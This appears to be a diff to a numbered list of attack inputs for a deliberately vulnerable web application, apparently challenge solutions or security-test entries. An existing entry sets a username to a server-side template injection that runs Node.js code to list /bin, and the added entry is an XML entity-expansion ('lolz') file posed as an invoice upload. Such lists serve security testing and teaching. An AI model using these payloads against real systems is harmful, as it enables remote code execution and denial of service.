@@ -25,3 +25,16 @@
 7. Profile:
 
    Username: `#{require('fs').readdirSync('/bin').join(',')}`
+
+8. Complaint:
+
+    Invoice file:
+    ```
+    <?xml version="1.0"?>
+      <!DOCTYPE lolz [
+       <!ENTITY lol "lol">
+       <!ELEMENT lolz (#PCDATA)>
+       <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+      ]>
+    <lolz>&lol1;</lolz>
+    ```
